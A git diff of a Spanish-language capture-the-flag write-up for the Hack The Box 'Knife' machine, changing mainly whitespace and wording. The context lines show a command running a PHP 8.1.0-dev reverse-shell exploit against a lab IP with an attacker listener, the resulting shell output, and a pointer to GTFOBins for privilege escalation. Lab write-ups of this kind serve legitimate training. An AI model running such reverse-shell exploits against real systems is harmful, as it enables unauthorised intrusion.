@@ -128,6 +128,7 @@ Submit the flag located in root's home directory.
 └─$ python revshell_php_8.1.0-dev.py http://10.129.28.20 10.10.14.110 4444
 
 ```
+
 Como el shell que conseguimos es muy limitado opto por utilizar el script de revershell
 
 ``` shell
@@ -140,12 +141,12 @@ Shell Banner:
 bash: cannot set terminal process group (860): Inappropriate ioctl for device
 bash: no job control in this shell
 james@knife:/$
------
-          
+-----        
 
 james@knife:/$ 
 ```
-Tenemos conexión ya solo falta elevar privilegios
+
+Tenemos una shell ya solo falta elevar privilegios
 
 Invetigo un poco este binario que desconocía [https://gtfobins.github.io/gtfobins/knife/](https://gtfobins.github.io/gtfobins/knife/)
 [https://manpages.ubuntu.com/manpages/trusty/man1/knife.1.html](https://manpages.ubuntu.com/manpages/trusty/man1/knife.1.html)
